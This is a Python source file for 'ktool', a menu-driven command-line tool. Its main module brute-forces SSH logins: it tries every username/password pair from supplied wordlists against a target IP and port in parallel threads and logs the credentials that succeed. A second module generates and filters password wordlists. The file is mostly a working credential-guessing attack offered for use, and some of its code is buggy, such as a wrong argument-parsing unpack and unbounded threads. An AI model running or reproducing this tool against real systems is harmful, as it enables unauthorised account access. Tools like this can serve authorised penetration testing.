import os
import sys
import paramiko
import time
import argparse
import logging
import threading
import itertools
import subprocess




def sys_arg_cleaner():
    prog_name = sys.argv[0]
    sys.argv.clear()
    sys.argv.append(prog_name)

def ssh_bruteforce():
    choice = 99
    sys_arg_cleaner()
    while(choice != "exit"):
        print("type 'exit' to go back.")
        print("""-h or --help for help""")
        print("\033[4mktool\033[0m" + "> ", end="")
        arguments = input()
        if(arguments == "exit"):
            main()

        sys.argv += arguments.split()

        try:
            parser = argparse.ArgumentParser(exit_on_error=False ,usage="-t TARGET -p PORT -u USERNAMES -w PASSWORDS")
            parser.add_argument("-t", "--target", help="Target IP address", required=True)
            parser.add_argument("-p", "--port", help="Target port", required=True)
            parser.add_argument("-u", "--usernames", help="Usernames file", required=True)
            parser.add_argument("-w", "--passwords", help="Passwords file", required=True)
            args, unknown = parser.parse_args()
        except :
            time.sleep(0.1)
            ssh_bruteforce()


        logging.basicConfig(filename='ssh_brute_force.log', level=logging.INFO)



        with open(args.usernames) as f:
            usernames = f.read().splitlines()

        with open(args.passwords) as f:
            passwords = f.read().splitlines()


        def try_login(username, password):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(args.target, port=args.port, username=username, password=password)
                print(f"[+] Login Successful! {username}:{password}")
                logging.info(f"[+] Login Successful! {username}:{password}")
                ssh.close()
            except paramiko.ssh_exception.AuthenticationException:
                print(f"[-] Login Failed! {username}:{password}")
            except paramiko.ssh_exception.SSHException:
                pass

        for username in usernames:
            for password in passwords:
                t = threading.Thread(target=try_login, args=(username,password))
                t.start()


def w_gen_mod():
    choice = 99
    sys_arg_cleaner()
    while(choice!="1" and choice != "2" and choice != "3"):
        print("""Select from the menu:
            1) generate a wordlist from scratch
            2) generate a wordlist from an existing one
            3) go back""")
        print("\033[4mktool\033[0m" + "> ", end="")
        choice = input()
        if(choice=="1"):

            def w_gen():
                sys_arg_cleaner()
                gen_choice = 99
                while (gen_choice != "exit"):
                    print("type 'exit' to go back.")
                    print("""-h or --help for help""")
                    print("\033[4mktool\033[0m" + "> ", end="")
                    arguments = input()
                    if (arguments == "exit"):
                        main()
                    sys.argv += arguments.split()
                    def generate_wordlist(min_length, max_length, charset):
                        for length in range(min_length, max_length + 1):
                            for word in itertools.product(charset, repeat=length):
                                yield "".join(word)

                    parser = argparse.ArgumentParser(description='Wordlist Generator',usage="-min MIN_LENGTH -max MAX_LENGTH [-c CHAR_SET] -o OUTPUT")
                    parser.add_argument("-min", "--min_length", type=int, help="Minimum length of words to generate", required=True)
                    parser.add_argument("-max", "--max_length", type=int, help="Maximum length of words to generate", required=True)
                    parser.add_argument("-c", "--charset",
                                        help="Charset to use for generating words (default: abcdefghijklmnopqrstuvwxyz)",
                                        default="abcdefghijklmnopqrstuvwxyz")
                    parser.add_argument("-o", "--output", help="Output file name", required=True)
                    args = parser.parse_args()

                    if(args.min_length > args.max_length):
                        print("min_length can't exceed max_length")
                        w_gen()

                    if(args.max_length > 4):
                        print("MAX LENGTH CAN'T EXCEED 4, YOU DON'T WANNA RUN OUT OF STORAGE, THIS WILL BE FIXED SOON!")
                        w_gen()

                    with open(args.output, 'w') as f:
                        for word in generate_wordlist(args.min_length, args.max_length, args.charset):
                            f.write(word + '\n')
                    print("wordlist generated in " + args.output)
            w_gen()
        elif(choice == "2"):

            def w_mod():
                sys_arg_cleaner()
                while (True):
                    print("type 'exit' to go back.")
                    print("""-h or --help for help""")
                    print("\033[4mktool\033[0m" + "> ", end="")
                    arguments = input()
                    if (arguments == "exit"):
                        main()
                    sys.argv += arguments.split()
                    parser = argparse.ArgumentParser(description="Wordlist Modifier",usage="-min MIN_LENGTH -max MAX_LENGTH [-c CHAR_SET] -w WORDLIST -o OUTPUT")
                    parser.add_argument("-min","--min_length",type = int, help="Minimum length of words that will be taken", required=True)
                    parser.add_argument("-max", "--max_length", type=int, help="Maximum length of words that will be taken", required=True)
                    parser.add_argument("-c", "--char_set", help="Charset for the words that will be taken (default: abcdefghijklmnopqrstuvwxyz)",
                                        default="abcdefghijklmnopqrstuvwxyz")
                    parser.add_argument("-w", "--wordlist", help="Input file name", required=True)
                    parser.add_argument("-o", "--output", help="Output file name", required=True)
                    args = parser.parse_args()

                    with open(args.wordlist) as input_file:
                        words = input_file.read().splitlines()

                    with open(args.output, 'w') as output_file:
                        for word in words:
                            w_len = len(word)
                            if (w_len >= args.min_length and w_len <= args.max_length):
                                output_file.write(word + "\n")
                    print("wordlist generated in " + args.output)
            w_mod()


        elif(choice == "3"):
            sys_arg_cleaner()
            main()

def main():

    choice = 99
    while(choice != 3):
        #subprocess.run(['clear'])
        print("""
        ██╗░░██╗████████╗░█████╗░░█████╗░██╗░░░░░
        ██║░██╔╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
        █████═╝░░░░██║░░░██║░░██║██║░░██║██║░░░░░
        ██╔═██╗░░░░██║░░░██║░░██║██║░░██║██║░░░░░
        ██║░╚██╗░░░██║░░░╚█████╔╝╚█████╔╝███████╗
        ╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝""")

        print("\n\nktool 1.12 Copyright (c) 2023 by Mohamed Karrab\n\n")

        print("""Select from the menu:
            1) ssh bruteforce
            2) wordlist generation/modification
            3) exit
            """)
        print("\033[4mktool\033[0m" + "> ",end="")
        choice = input()
        if(choice == "1"):
            ssh_bruteforce()
        elif(choice == "2"):
            w_gen_mod()
        elif(choice == "3"):
            sys.exit()
        print("")


"""
  time.sleep(3)
"""

if __name__ == '__main__':
    main()
